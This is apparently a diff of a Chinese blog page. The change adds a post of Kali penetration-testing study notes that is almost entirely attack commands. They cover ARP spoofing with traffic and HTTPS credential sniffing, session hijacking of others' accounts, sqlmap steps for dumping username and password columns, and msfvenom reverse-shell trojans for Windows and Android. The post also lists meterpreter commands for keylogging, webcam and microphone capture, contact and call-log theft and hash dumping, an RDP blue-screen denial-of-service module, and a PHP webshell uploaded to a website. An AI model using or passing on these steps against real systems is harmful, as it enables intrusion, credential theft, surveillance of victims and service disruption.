@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://showmeshell.top">
-  <title>Tag: pwn | Esther-Cheung And ShowMeShell&#39;s Blog</title>
+  <title>Kali渗透学习笔记 | Esther-Cheung And ShowMeShell&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="The Road Of Reverse And Web~">
-<meta name="keywords" content="Security">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:url" content="http://showmeshell.top/tags/pwn/index.html">
+  <meta name="description" content="Kali渗透测试 Xshell连接  1234开启SSH链接kali中进入命令行模式 alt+ctrl+f1=&amp;gt; /etc/init.d/ssh startXshell链接 ：输入kali的ip，root账户密码即可kali后台运行    arp攻击：  目标的ip流量经过我的网卡 arpspoof  -i 网卡 -t 目标IP 网关 查看局域网ip Fping -asg 192.168.1">
+<meta name="keywords" content="Web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali渗透学习笔记">
+<meta property="og:url" content="http://showmeshell.top/2018/09/21/Kali渗透学习笔记/index.html">
 <meta property="og:site_name" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta property="og:description" content="The Road Of Reverse And Web~">
+<meta property="og:description" content="Kali渗透测试 Xshell连接  1234开启SSH链接kali中进入命令行模式 alt+ctrl+f1=&amp;gt; /etc/init.d/ssh startXshell链接 ：输入kali的ip，root账户密码即可kali后台运行    arp攻击：  目标的ip流量经过我的网卡 arpspoof  -i 网卡 -t 目标IP 网关 查看局域网ip Fping -asg 192.168.1">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-09-21T02:13:06.676Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Esther-Cheung And ShowMeShell&#39;s Blog">
-<meta name="twitter:description" content="The Road Of Reverse And Web~">
+<meta name="twitter:title" content="Kali渗透学习笔记">
+<meta name="twitter:description" content="Kali渗透测试 Xshell连接  1234开启SSH链接kali中进入命令行模式 alt+ctrl+f1=&amp;gt; /etc/init.d/ssh startXshell链接 ：输入kali的ip，root账户密码即可kali后台运行    arp攻击：  目标的ip流量经过我的网卡 arpspoof  -i 网卡 -t 目标IP 网关 查看局域网ip Fping -asg 192.168.1">
   
     <link rel="alternative" href="/atom.xml" title="Esther-Cheung And ShowMeShell&#39;s Blog" type="application/atom+xml">
   
@@ -148,98 +149,328 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Kali渗透学习笔记" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/11/Relocatable code injection-based binary patching/" class="archive-article-date">
-  	<time datetime="2018-07-11T01:40:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-11</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/11/Relocatable code injection-based binary patching/">基于二进制修补的重定位代码注入</a>
+    <h1 class="article-title" itemprop="name">
+      Kali渗透学习笔记
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/09/21/Kali渗透学习笔记/" class="archive-article-date">
+  	<time datetime="2018-09-21T02:11:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="Kali渗透测试"><a href="#Kali渗透测试" class="headerlink" title="Kali渗透测试"></a>Kali渗透测试</h3><ul>
+<li><p>Xshell连接</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">开启SSH链接</span><br><span class="line">kali中进入命令行模式 alt+ctrl+f1=&gt; /etc/init.d/ssh start</span><br><span class="line">Xshell链接 ：输入kali的ip，root账户密码即可</span><br><span class="line">kali后台运行</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>arp攻击：</p>
+<ul>
+<li>目标的ip流量经过我的网卡</li>
+<li><code>arpspoof  -i 网卡 -t 目标IP 网关</code></li>
+<li>查看局域网ip <code>Fping -asg 192.168.1.0/24</code></li>
+<li>IP流量转发： <code>echo 1 &gt;/proc/sys/net/ipv4/ip_forward</code> 就不会出现断网</li>
+</ul>
+</li>
+<li><p>arp欺骗</p>
+<ul>
+<li><p>目标的ip流量经过我的网卡，从网关出去</p>
+</li>
+<li><p>先进行arp欺骗</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof  -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>driftnet  -&gt;获取本机网卡的流量信息</p>
+<ul>
+<li><code>driftnet -i 网卡</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>http账户密码获取</p>
+<ul>
+<li><code>Ettercap</code>：欺骗，DNS欺骗，流量嗅探</li>
+<li>先进行arp欺骗</li>
+<li><code>ettercap -Tq -i 网卡</code> 启动文本模式和安静模式 嗅探流量</li>
+</ul>
+</li>
+<li><p>https账户密码获取</p>
+<ul>
+<li><code>sslstrip</code>工具 将https链接还原为HTTP</li>
+<li><code>vim /etc/ettercap/etter.conf</code>  删除<code>if you use iptables：</code>底下的2个#注释</li>
+<li>先进行 <code>sslstrip -a -f -k</code></li>
+<li>再进行arp欺骗</li>
+<li>最后嗅探 ettercap</li>
+<li>缺点：https容易出现证书错误</li>
+</ul>
+</li>
+<li><p>会话截取-登录别人的百度贴吧</p>
+<ul>
+<li>方法一：<ul>
+<li><code>arpspoof + wireshark+ferret（重新生成抓包后的文件）+hamster（重放流量）</code></li>
+<li>先 arp欺骗</li>
+<li>wireshark抓包：增加本地网卡，等刷新后，保存xxx.pcap文件</li>
+<li><code>ferret -r xxx.pcap</code>   生成<code>hamster.txt</code>文件</li>
+<li>将hamster.txt文件拷贝到/root/目录</li>
+<li><code>hamster</code> 命令，安装要求打开浏览器设置代理及端口，可以看到欺骗的ip</li>
+<li>寻找重放的页面</li>
+</ul>
+</li>
+<li>方法二：<ul>
+<li>不需要欺骗</li>
+<li><code>ferret -i 网卡</code>   浏览器设置端口</li>
+<li><code>hamster</code>  浏览器设置端口1234</li>
+<li>实时重放页面可挟持</li>
+</ul>
+</li>
+<li>方法三：<ul>
+<li>一键劫持软件：CookieCadger-jar </li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>SQLMAP及ASP网站渗透</p>
+<ul>
+<li>asp网站 大多数用的Access和MSSQL</li>
+<li><code>sqlmap -u &quot;URL&quot;</code>:检测是否存在注入，返回数据库的名字</li>
+<li><code>sqlmap -u &quot;URL&quot; --tables</code> 猜解所有的表名</li>
+<li><code>sqlmap -u &quot;URL&quot; --columns -T &quot;tables名字&quot;</code>  猜列名</li>
+<li><code>sqlmap -u &quot;URL&quot; --dump -C &quot;username,password&quot; -T &quot;tables的名字&quot;</code>  –dump下载数据</li>
+</ul>
+</li>
+<li><p>SQLMAP及PHP网站渗透</p>
+<ul>
+<li>php网站大多数是mysql</li>
+<li><code>sqlmap -u &quot;URL&quot;</code>:检测是否有注入</li>
+<li><code>sqlmap -u &quot;URL&quot; --is-dba</code>  ：是否能遍历,目录文件写文件</li>
+<li><code>sqlmap -u &quot;URL&quot; --dbs</code> 列出所有数据库</li>
+<li><code>sqlmap -u &quot;URL&quot; --current-db</code> 查找自己当前使用的数据库</li>
+<li><code>sqlmap -u &quot;URL&quot; --tables -D &quot;数据库名&quot;</code> 根据数据来猜解所有的表名</li>
+<li><code>sqlmap -u &quot;URL&quot; --columns -T &quot;表名&quot; -D &quot;数据库名&quot;</code> 查询所有的列</li>
+<li><code>sqlmap -u &quot;URL&quot; --dump -C &quot;username,password&quot; -T &quot;表名&quot; -D &quot;数据库名&quot;</code> 查询列的字段</li>
+</ul>
+</li>
+<li><p>SQLMAP及Cookie注入</p>
+<ul>
+<li><code>sqlmap -u &quot;URL&quot;  --cookie &quot;id参数&quot; --level 2</code> &lt;不需要？及id=？，以asp等结尾的URL&gt; 、cookie注入，就要把等级提升为level 2</li>
+</ul>
+</li>
+<li><p>Metasploit</p>
+<ul>
+<li>启动<code>msfconsole</code></li>
+<li>Exploit模块=&gt;漏洞利用，Payloads=&gt;-hellcode 漏洞利用后执行的代码</li>
+<li>使用 <ul>
+<li><code>use exploit/windows/smb/ms08_067_netapi</code>选择漏洞利用模块</li>
+<li><code>show options</code> 查看要填入的参数</li>
+<li><code>set RHOST ....</code></li>
+<li><code>set PAYLOAD xx/xx/xx</code></li>
+<li><code>show options</code></li>
+<li><code>exploit</code> 执行</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Metasploit远程控制软件</p>
+<ul>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.根据自己的ip生成一个木马/msfvenom</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx1 LPROT=xx2 -f exe &gt; xx.exe</span><br><span class="line">2.使用handler模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">使用shellcode选项</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">查看选项</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> LHOST xx1</span><br><span class="line"><span class="built_in">set</span> LPROT xx2</span><br><span class="line">3.exploit</span><br><span class="line">等待对方点击xx.exe木马文件</span><br><span class="line">4.sysinfo/shell等命令</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#木马常用功能：</span></span><br><span class="line">1.backgroud &lt;会话切换&gt;</span><br><span class="line">  session -l 查看session进程</span><br><span class="line">  session -i x 选择session进程</span><br><span class="line">******注入进程重要**********</span><br><span class="line">2.ps得到我们要注入的pid进程</span><br><span class="line">  migrate xxx：注入进程</span><br><span class="line">3.run vnc  ：开启远程桌面</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文件管理功能</span></span><br><span class="line">download 下载文件</span><br><span class="line">edit	 编辑文件</span><br><span class="line">cat		 查看文件</span><br><span class="line">mkdir	 创建文件夹</span><br><span class="line">mv		 移动文件</span><br><span class="line">rm		 删除文件</span><br><span class="line">upload	 上传文件</span><br><span class="line">rmdir    删除文件夹</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#网络及系统操作</span></span><br><span class="line">arp			看ARP缓冲表</span><br><span class="line">ifconfig	IP地址网卡</span><br><span class="line">getproxy	获取代理</span><br><span class="line">netstat		查看端口链接</span><br><span class="line"><span class="built_in">kill</span>		结束进程</span><br><span class="line">ps			查看进程</span><br><span class="line">reg			修改注册表</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用户接口</span></span><br><span class="line">enumdesktop		窗体列表</span><br><span class="line">keyscam_dump	键盘记录下载</span><br><span class="line">keyscan_strat	键盘记录开始</span><br><span class="line">keyscan_stop	键盘记录停止</span><br><span class="line">uictl			获取键盘鼠标控制权 -h 查看选项</span><br><span class="line">record_mic		音频录制</span><br><span class="line">webcam_chat		查看摄像头接口</span><br><span class="line">webcam_list		查看摄像头列表</span><br><span class="line">webcam_stream	摄像头视频获取</span><br><span class="line">getsystem		获取高权限</span><br><span class="line">hashdump		下载<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>Android渗透测试</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.生成apk</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=xx1 LPROT=xx2 -f apk &gt; xxx.apk</span><br><span class="line">生成apk文件</span><br><span class="line">2.使用handler模块</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">使用shellcode选项</span><br><span class="line">set PAYLOAD android/meterpreter/reverse_tcp</span><br><span class="line">3.查看选项</span><br><span class="line">show options</span><br><span class="line">set LHOST xx1</span><br><span class="line">set LPROT xx2</span><br><span class="line">4.exploit</span><br><span class="line">5.手机安装apk文件</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search</span><br><span class="line">download</span><br><span class="line">ps 	查看qq进程</span><br><span class="line">webcam_snap 截屏</span><br><span class="line">webcam_stream -i 1/2 开启摄像头</span><br><span class="line">check_root	检测ROOT</span><br><span class="line">dump_calllog 下载电话记录</span><br><span class="line">dump_contact 下载联系人记录</span><br><span class="line">Geolocate	定位</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>Metasploit服务器蓝屏</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">服务器开启3389</span><br><span class="line">确定服务器ip</span><br><span class="line">auxiliary/dos/windows/rdp/ms12_020_maxchannelids</span><br><span class="line">服务器远程桌面的一个利用模块</span><br><span class="line">auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">扫描主机是否存在漏洞</span><br></pre></td></tr></table></figure>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1. msfconsole</span><br><span class="line">2. search ms12_020</span><br><span class="line">3. use auxiliary/scanner/rdp/ms12_020_check</span><br><span class="line">4. show options</span><br><span class="line">5. set RHOST xx.xx.xx.xx</span><br><span class="line">6. exploit 确定了xx.xx.xx.xx：3389存在</span><br><span class="line">7. user auxiliary/dos/windows/rdp/ms12_020_check</span><br><span class="line">8. show options</span><br><span class="line">9. set RHOST xx.xx.xx.xx</span><br><span class="line">10. exploit</span><br><span class="line">11. 蓝屏攻击成功</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>Metasploit 生成webshell及应用</p>
+<ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.msf生成一个php脚本</span><br><span class="line">msfpayload php/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx R &gt; web.php</span><br><span class="line">2.上传php脚本到网站上</span><br><span class="line">3.user exploit/multu/handler</span><br><span class="line">4.show options</span><br><span class="line">5. set LHost</span><br><span class="line">6.exploit</span><br><span class="line">7.访问web.php</span><br><span class="line">8.反弹出了会话</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/zhifubao.jpeg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/img/weixin.jpeg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://showmeshell.top/2018/09/21/Kali渗透学习笔记/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/07/06/缓冲区溢出及防御/" class="archive-article-date">
-  	<time datetime="2018-07-06T06:27:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-06</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/17/CVE-2012-6422/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">CVE-2012-6422</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/07/06/缓冲区溢出及防御/">缓冲区溢出及防御</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -276,9 +507,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
